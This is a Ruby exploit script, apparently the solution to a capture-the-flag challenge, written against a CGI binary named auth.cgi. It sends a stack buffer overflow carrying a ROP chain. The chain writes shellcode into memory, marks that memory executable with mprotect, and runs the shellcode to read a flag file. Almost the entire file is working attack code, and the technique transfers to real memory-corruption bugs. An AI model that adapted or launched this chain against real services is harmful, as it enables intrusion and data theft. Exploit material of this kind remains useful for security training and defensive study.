# Encoding: ascii-8bit

require './libronsolve'
require 'base64'
require 'httparty'

# Gadgets
POP_RDI_RET = 0x401D90 # 5fc3
POP_RSI_RET = 0x40F782 # 5ec3
POP_RDX_POP_RBX_RET = 0x4696D7 # 5a5bc3 - best I could find
POP_RAX_POP_RDX_POP_RBX_RET = 0x4696D6 # 585a5bc3
MOV_RAX_PTR_EDX_RET = 0x416E10 # 488902

# Random address in the data segment that we will write our shellcode to
# (this can be basically anywhere)
WRITEABLE_MEMORY = 0x4A6000

# Libc functions statically linked in
MPROTECT = 0x439450

# Debug breakpoint
DEBUG = 0x461F5F

# Argument to mprotect()
PROTECT_READ_WRITE_EXEC = 7

# Random value for padding
INDIFFERENT_VALUE = 0x5a5a5a5a5a5a5a5a

# Super inefficient "read file / write stdout" shellcode
SHELLCODE = ["b802000000e8130000002f686f6d652f6374662f666c61672e747874005fbe00000000ba000000000f055750b8000000005f5eba240000000f05b801000000bf01000000ba240000000f05b83c000000bf000000000f05cccccccccccccccc"].pack('H*')

# Break our shellcode into 8-byte chunks
offset = 0
stack = ""
SHELLCODE.scan(/.{8}/) do |code|
  # For each chunk, do:
  # rax = <offset we want to write code to>
  # rdx = <current 8 bytes of shellcode>
  # rbx = indifferent value - it's just along for the ride
  stack += [
    POP_RAX_POP_RDX_POP_RBX_RET,
    code.unpack('q').pop,
    WRITEABLE_MEMORY + offset,
    INDIFFERENT_VALUE,
    MOV_RAX_PTR_EDX_RET,
  ].pack('q*')
  offset += 8
end

# Once we're done writing shellcode, use mprotect() to make the memory +rwx
stack += [
  POP_RDI_RET,
  WRITEABLE_MEMORY,

  POP_RSI_RET,
  SHELLCODE.length,

  POP_RDX_POP_RBX_RET,
  PROTECT_READ_WRITE_EXEC,
  INDIFFERENT_VALUE,

  MPROTECT, # memprotect(WRITABLE_MEMORY, (length), +rwx)
].pack('q*')

# Finally, return into the shellcode (which has an exit at the end)
stack += [
  # Return into the shellcode
  WRITEABLE_MEMORY,
].pack('q*')

# Return address offset from the start of the buffer
PADDING = 168

# Exploit = the padding + our ROP stack
EXPLOIT = ("A" * PADDING) + stack

# File.write("/tmp/exploit.bin", EXPLOIT)
# system "CONTENT_LENGTH=#{EXPLOIT.length} gdb ../challenge/src/auth.cgi"
# exit

# Send the payload
HOST, PORT = get_host_port()
puts "Connecting to #{HOST}:#{PORT}..."
s = TCPSocket.new(HOST, PORT)
s.write(
  "GET /cgi-bin/auth.cgi HTTP/1.0\r\n" +
  "Content-Length: #{EXPLOIT.length}\r\n" +
  "\r\n" +
  "#{EXPLOIT}"
)

flag = s.read.split(/\n/).pop

check_flag(flag, terminate: true)
